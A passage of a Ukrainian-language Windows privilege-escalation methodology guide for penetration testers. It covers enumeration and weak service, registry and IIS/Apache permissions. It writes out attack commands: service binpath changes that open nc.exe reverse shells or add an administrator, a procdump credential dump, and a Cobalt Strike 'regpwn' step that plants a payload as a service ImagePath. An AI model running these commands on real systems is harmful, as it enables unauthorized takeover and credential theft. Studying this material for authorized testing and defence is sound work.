Щоб скористатися цією вразливістю, можна використати: _exploit/windows/local/always_install_elevated_

## Антивіруси та засоби виявлення

### Параметри аудиту

Ці параметри визначають, що **журналюється**, тож зверніть на них увагу

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding — цікаво знати, куди надсилаються журнали.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** призначений для **керування паролями локального Administrator**, гарантуючи, що кожен пароль на комп’ютерах, приєднаних до домену, є **унікальним, випадковим і регулярно оновлюється**. Ці паролі безпечно зберігаються в Active Directory, і доступ до них мають лише користувачі з достатніми дозволами через ACL, що дає їм змогу переглядати паролі локального адміністратора за наявності відповідних прав.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо функцію активовано, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Докладніше про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### Захист LSA

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби недовірених процесів **читати її пам’ять** або впроваджувати код, додатково захищаючи систему.\
[**Більше інформації про захист LSA тут**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard** з’явився у **Windows 10**. Його призначення — захищати облікові дані, збережені на пристрої, від таких загроз, як атаки pass-the-hash. [**Більше інформації про Credential Guard доступно тут.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Кешовані облікові дані

**Доменні облікові дані** проходять автентифікацію через **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані для входу користувача проходять автентифікацію за допомогою зареєстрованого пакета безпеки, для цього користувача зазвичай створюються доменні облікові дані.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Користувачі й групи

### Перелік користувачів і груп

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Привілейовані групи

Якщо ви **належите до привілейованої групи, можливо, ви зможете підвищити привілеї**. Дізнайтеся про привілейовані групи та про те, як використовувати їх для підвищення привілеїв, тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляції з token

**Дізнайтеся більше** про те, що таке **token**, на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наступну сторінку, щоб **дізнатися про цікаві tokens** та про те, як їх використовувати:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Авторизовані користувачі / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримання вмісту буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Перш за все, під час перегляду списку процесів **перевірте, чи немає паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл** або чи маєте дозвіл на запис у папку з бінарним файлом, щоб скористатися можливими [**атаками DLL Hijacking**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md): їх можна використати для підвищення привілеїв.

Слухач налагоджувача може працювати недовго, тому його відсутність в одному знімку портів, отриманому пасивним способом, не доводить, що він ніколи не був доступний. Якщо виявлено слухач, зіставте його з PID, власником процесу та можливістю користувача з нижчими привілеями звернутися до нього; сама назва застосунку або прапорець налагодження не підтверджують можливість виконання коду від імені іншого користувача. Під час звичайного збору даних дійте пасивно й не надсилайте команди налагоджувачу.

**Перевірка дозволів на виконувані файли процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів на папки з бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати спільні бібліотеки з каталогу `dynamicpreprocessor directory`, указаного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Якщо заплановане завдання або служба запускає Snort від імені іншого облікового запису, перевірте саме цю конфігурацію та ACL каталогу модулів, указаного в ній. Якщо ваш токен дозволяє створювати там файли, цей шлях варто перевірити на можливість виконання коду під час наступного завантаження модулів завданням або службою. Перевірте ефективні привілеї облікового запису, від імені якого запускається процес, активну конфігурацію, сумісність модулів, а також обмеження заборони доступу чи спільного доступу; сам факт можливості запису в каталог не доводить наявність шляху до підвищення привілеїв. У [документації Snort щодо dynamic preprocessor](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована вебслужба з кореневим каталогом документів, доступним для запису

В інсталяції Apache для Windows зіставте шлях до виконуваного файла служби та обліковий запис, від імені якого вона запускається, зі значенням `DocumentRoot` в активному `httpd.conf`. Для типового компонування XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто це `C:\xampp\htdocs`. Якщо користувач із нижчим рівнем привілеїв може створювати файли в цьому каталозі, а Apache працює від імені `LocalSystem`, виконання коду на сервері може перетнути межу привілеїв хоста. Переконайтеся, що служба запущена, що обслуговується саме цей шлях і що обробник на сервері виконує файли відповідного типу; можливість запису в кореневий каталог сама по собі доводить лише можливість створення файлів. Перевірте ACL, не створюючи тестовий файл:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для звичайної інсталяції WAMP служба може вказувати на версіонований `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а файл конфігурації поруч із ним — у `conf\httpd.conf`; кореневим каталогом за замовчуванням буде `C:\wamp64\www` або `C:\wamp\www`. Перевірте точний образ служби, обліковий запис, від імені якого вона запускається, ефективний `DocumentRoot` (зокрема розгортання `${INSTALL_DIR}` і перевизначення віртуальних хостів) та ACL кореневого каталогу. Те, що каталог WAMP доступний для запису, не доводить, що Apache працює від імені `SYSTEM` або виконує надісланий файл. [В документації Apache описано, як служба Windows вибирає конфігурацію](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте призначений йому пул і обробник на сервері. Код у каталозі, з якого надаються файли, виконується від імені пулу лише тоді, коли IIS обробляє цей тип файлу та маршрут доступний. Перш ніж вважати доступний для запису каталог шляхом до виконання коду, перевірте ефективний дозвіл поточного користувача на створення файлів, стан сайту під час виконання, обробник і перевизначення для відповідного шляху.

Динамічна компіляція ASP.NET — це окремий шлях, який слід перевірити: згенеровані файли в каталозі компіляції застосунку. За замовчуванням це каталог `Temporary ASP.NET Files` у відповідній інсталяції .NET Framework, але параметр `<compilation tempDirectory>` застосунку може змінити його. [Microsoft описує розташування та підкаталоги для окремих застосунків](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) і [рекомендує ізолювати каталоги компіляції, якщо пули застосунків не довіряють один одному](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен із нижчими привілеями дає змогу змінювати згенерований вихідний код у кеші **конкретного** застосунку, з’ясуйте, чи компілює цей застосунок його повторно від імені більш привілейованого [облікового запису робочого процесу](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Самі по собі ACL файлу або каталогу не доводять можливість виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом будь-якої повторної компіляції. Перевіряйте лише метадані, не змінюючи їх; під час переліку не запускайте компіляцію та не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується до ресурсів домену як **обліковий запис комп’ютера**, навіть якщо його локальний токен має низькі привілеї. `LocalSystem` уже має високі локальні привілеї та також використовує в мережі обліковий запис комп’ютера; `LocalService` зазвичай використовує анонімні облікові дані мережі. Пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft описує ці типи ідентичностей](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [мережеву ідентичність пулу застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не задано, можуть успадковуватися значення за замовчуванням для пулу, які відрізняються залежно від версії IIS, тому визначте ефективну конфігурацію, а не робіть припущень за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю облікового запису комп’ютера, перевірте права **саме цього комп’ютера** в домені. [DCSync](../active-directory-methodology/dcsync.md) потребує прав реплікації в контексті іменування домену; сам по собі квиток облікового запису комп’ютера або роль хоста цього не доводить. Під час пасивного переліку переглядайте конфігурацію та ACL, не завантажуючи файли, не ініціюючи мережеву автентифікацію та не запитуючи квитки.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте шлях будь-якого значення, отриманого із запиту, через автентифікацію, розшифрування, перевірку та формування команди. Якщо обробник конкатенує декодований токен у `ProcessStartInfo("cmd", "/c ...")`, метасимволи оболонки можуть змінити команду; [Microsoft описує спеціальні символи `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що ненадійний клієнт справді може впливати на декодоване значення та звернутися до обробника, а потім визначте ефективну ідентичність пулу застосунків або імперсонованого користувача й ідентичність дочірнього процесу. Доступний для читання рядок вихідного коду, локальний слухач або слабкість формату токена самі по собі не доводять можливість виконання команд із підвищеними привілеями. Під час пасивного переліку переглядайте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес.

Для служби PHP у Windows шлях, контрольований запитом і переданий у [`include` або `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файлу, доступного для запису користувачеві з нижчими привілеями, від імені робочого процесу. Переконайтеся, що запит може дійти до цього оператора, визначений шлях вказує на файл, який користувач із нижчими привілеями може змінити, а робочий процес — прочитати, обмеження шляхів PHP дозволяють включення, і робочий процес справді має вищі привілеї. Локальний слухач або доступний для запису файл самі по собі не доводять наявність такого ланцюжка; під час пасивного переліку перевірте вихідний код, ідентичність служби та ACL файлів, не викликаючи кінцеву точку.

### Пошук паролів у пам’яті

За допомогою **procdump** із sysinternals можна створити дамп пам’яті запущеного процесу. Служби на кшталт FTP зберігають **облікові дані у відкритому вигляді в пам’яті**; спробуйте зняти дамп пам’яті та прочитати ці облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Небезпечні GUI-програми

**Програми, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: «Довідка та підтримка Windows» (Windows + F1), знайдіть «command prompt», натисніть «Click to open Command Prompt»

### Імпорт файлів проєктів із підвищеними привілеями

Програма, яка автоматично відкриває проєкти з каталогу для скидання файлів, доступного для запису користувачам із нижчими привілеями, перетинає межу довіри до вхідних даних від імені облікового запису імпортера. Перевірте **точний шлях із доступом на запис**, процес або завдання, яке його відкриває, ефективний контекст безпеки та версію парсера. [Історична проблема з відкриттям/відновленням проєкту Ghidra](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяли [політики вихідного SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це вказує на можливе розкриття облікових даних, а не на негайний доступ адміністратора: отриману відповідь потрібно мати змогу використати окремим авторизованим або вразливим шляхом, а поточні збірки потрібно оцінювати з огляду на фактичний стан виправлень. Не відкривайте створений для цього проєкт під час пасивного переліку; перевірте процес імпорту та ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) для об'єкта Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний запит лише на читання [`OpenSCManager` для отримання цього права](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) є підставою для перевірки, а не доказом того, що нову службу можна запустити. [`CreateService повертає handle`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами доступу до служби, запитаними під час її створення; повторне відкриття служби згодом виконує окрему перевірку доступу й може завершитися невдачею, навіть якщо можна було скористатися початковим handle. Окремо перевірте ефективний локальний або віддалений токен, надані права handle, обліковий запис служби, політику запуску та шлях до виконуваного файла. Не створюйте й не запускайте службу під час пасивного переліку.

Для віддаленого шляху встановлення служби зіставте ці права SCM із мережевим ресурсом на цільовій системі, до якого має доступ на запис **той самий мережевий сеанс входу**, його базовим ACL NTFS і локальним шляхом до виконуваного файла, який може запустити обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо існують незвично широкі права SCM і шлях розміщення файла; адміністративний мережевий ресурс не є обов'язковою передумовою. Сам по собі доступ на запис до мережевого ресурсу або окремо виявлена можливість створення служби через SCM не доводять, що нову службу можна запустити з вищими привілеями.

Наявна служба може запускати допоміжний виконуваний файл під час запуску, зупинки або іншої події життєвого циклу, навіть якщо цього допоміжного файла немає в її `ImagePath`. Якщо ім'я допоміжного файла знаходить шлях до каталогу, доступного для запису користувачам із нижчими привілеями, а служба працює з вищими привілеями, відсутній допоміжний файл може бути умовним кандидатом на заміну. Підтвердьте **фактичний код служби або задокументований виклик допоміжної програми**, визначений шлях до виконуваного файла та порядок пошуку, права на створення каталогу, контекст безпеки служби й доступний тригер життєвого циклу. Каталог служби з доступом на запис або відсутній файл самі по собі не доводять, що служба завантажує цей файл; під час пасивної перевірки не запускайте й не зупиняйте службу.

Для наявної служби право [`SERVICE_START` дозволяє передавати аргументи в `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); воно відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або її задокументований інтерфейс. Якщо вона використовує аргумент, вибраний викликачем, як шлях до журналу чи файлу експорту, перевірте контекст безпеки служби, точний шлях передавання аргументу до операції запису, обмеження шляхів і дозволи для **створеного файла**. Запис у захищений каталог може призвести до підвищення привілеїв лише за наявності окремого привілейованого споживача або завантажувача, який приймає цей файл; самі по собі доступний для запису журнал або право запуску недостатні. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ файл `nsclient.ini`, доступний для читання, є **підставою перевірити конфігурацію**: він може містити облікові дані вебінтерфейсу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, слухач WEB і політику доступу, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для привілейованого виконання також потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), ефективне право реєструвати або змінювати команду та тригер, який запускає її від імені служби. Слухач, доступний лише через loopback, усе одно може бути досяжним для локального користувача, але самі по собі шлях до файла, пароль або слухач не доводять наявності цих прав. Під час пасивної перевірки переглядайте метадані й дозволи, не відображаючи секрети та не викликаючи веб-API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації з безпеки вебінтерфейсу та скриптів](https://nsclient.org/docs/setup/securing/) і [конфігурацію зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис запуску служби та значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає там дочірню програму](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), а `AppDirectory` — це налаштований робочий каталог. Перш ніж вважати дозволи обгортки всією межею безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківського каталогу. Локальна кінцева точка WCF або SOAP, яку надає ця дочірня програма, є окремою підставою для перевірки: підтвердьте, що кінцева точка доступна користувачу з нижчими привілеями, конкретна операція приймає його введені дані, а дочірня програма служби виконує небезпечну операцію з вищими привілеями. Обліковий запис служби, URL кінцевої точки або шлях із доступом на запис самі по собі не доводять можливості підвищення привілеїв; під час пасивної перевірки не викликайте операції служби.

Для користувацької операції WCF простежте, чи потрапляє рядок, контрольований викликачем, до будь-якого середовища виконання PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` запускає конвеєр](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` з обліковими даними Windows для транспортного рівня](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але право викликати **саме цю** операцію та ефективний контекст безпеки середовища виконання потрібно перевіряти окремо. Шлях від введених даних викликачем із нижчими привілеями до `AddScript`, який виконується з вищими привілеями служби, є межею виконання коду; самі по собі порт, що прослуховується, автентифікований клієнт або невикористовуваний метод у сторонній збірці нічого не доводять. Статично перевірте розгорнуту службу, контракт, авторизацію та параметри імперсоналізації, не викликаючи кінцеву точку під час переліку.

Тригери служб дають Windows змогу запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запускати привілейовані служби, активуючи їхні тригери. Методи переліку й активації наведено тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

Інсталяції Visual Studio з інструментами C/C++ можуть містити `VSStandardCollectorService150` — діагностичну службу, налаштовану для роботи від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) використовували junction і перегони із символічним посиланням диспетчера об'єктів, щоб перенаправити скидання DACL служби. Для продемонстрованого підвищення привілеїв також потрібен був доступний шлях відновлення MSI через Visual Studio Setup WMI Provider і його цільовий файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивного сортування перевірте обліковий запис і шлях до двійкового файла лише цієї служби, з'ясуйте, чи існує шлях до компілятора Setup WMI, і перевірте стан виправлення встановленого компонента. Запис служби, версія продукту Visual Studio або сам файл компілятора не доводять, що система вразлива. Для перевірки не потрібно запускати службу чи виконувати відновлення.

Отримати список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

За допомогою **sc** можна отримати інформацію про службу.

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевіряти необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть учасники групи «Authenticated Users» змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ви можете завантажити accesschk.exe для XP звідси](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо виникає така помилка (наприклад, із SSDPSRV):

_Виникла системна помилка 1058._\
_Службу не можна запустити, оскільки її вимкнено або з нею не пов’язано жодних увімкнених пристроїв._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Врахуйте, що для роботи служби upnphost потрібна служба SSDPSRV (у XP SP1)**

**Ще один спосіб обійти** цю проблему — виконати:

```
sc.exe config usosvc start= auto
```

### **Змінити шлях до бінарного файлу служби**

Якщо група «Автентифіковані користувачі» має право **SERVICE_ALL_ACCESS** для служби, можна змінити її виконуваний бінарний файл. Щоб змінити й виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапуск служби

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Підвищити привілеї можна за допомогою різних дозволів:

- **SERVICE_CHANGE_CONFIG**: Дозволяє змінювати конфігурацію бінарного файлу служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та змінювати дозволи.
- **GENERIC_WRITE**: Надає успадковану можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також надає успадковану можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна скористатися _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого облікового запису домену, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або батьківську папку**, часто можна перехопити службу, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який запускає служба**, або чи маєте **дозвіл на запис до папки**, у якій розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
За допомогою **wmic** (не в system32) можна отримати список усіх бінарних файлів, які запускаються службами, і перевірити дозволи за допомогою **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** чи **`(W)`** для виконуваного файла служби або каталогу, у якому він міститься. Практична схема зловживання:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файла за допомогою `sc qc <service_name>`.
2. Перевірте, чи доступний бінарний файл для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби на payload або дійсний шкідливий бінарний файл служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію в разі збою, яка повторно запускає її, або чи може застосунок, що використовує її, запустити її опосередковано.

### Дозволи на зміну реєстру служб

Перевірте, чи можете ви змінювати реєстр будь-якої служби.\
Ви можете **перевірити** свої **дозволи** на **реєстр** служби так:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Початкову перевірку дозволів було сформульовано так:

Слід перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, можна змінити бінарний файл, який запускає служба.

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи на запис у реєстрі для певного ключа служби. Сам запис ACL не доводить наявності ефективного доступу: важливі записи заборони, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об’єкта служби. Для підвищення привілеїв також потрібні придатне для використання поле конфігурації служби, спосіб запустити службу та обліковий запис служби з вищими привілеями. Див. [права доступу до ключів реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) і [довідник із прав доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) від Microsoft.

Щоб змінити шлях до бінарного файлу, який запускається:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Гонка з symlink у реєстрі для запису довільного значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для кожного користувача, які згодом процес **SYSTEM** копіює до ключа сеансу HKLM. **Гонка з символічним посиланням** у реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив для **запису довільного значення** в HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: Екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить перелік встановлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає керовану користувачем конфігурацію.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему або переходу на захищений робочий стіл і доступний для запису користувачу.

Сценарій експлуатації (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має записати SYSTEM.
2. Запустіть копіювання для захищеного робочого столу (наприклад, **LockWorkstation**), що ініціює потік брокера AT.
3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **посилання реєстру** на захищений цільовий ключ HKLM.
4. SYSTEM запише вибране зловмисником значення до перенаправленого шляху HKLM.

Отримавши можливість довільно записувати значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служб:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запускати звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** реалізація публічного експлойту **блокує робочу станцію** під час гонки.

Приклади інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Якщо у вас є цей дозвіл на реєстр, це означає, що **ви можете створювати вкладені розділи реєстру в ньому**. У випадку служб Windows цього **достатньо, щоб виконати довільний код:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до виконуваного файлу не взято в лапки, Windows намагатиметься виконати кожен варіант шляху, що закінчується перед пробілом.

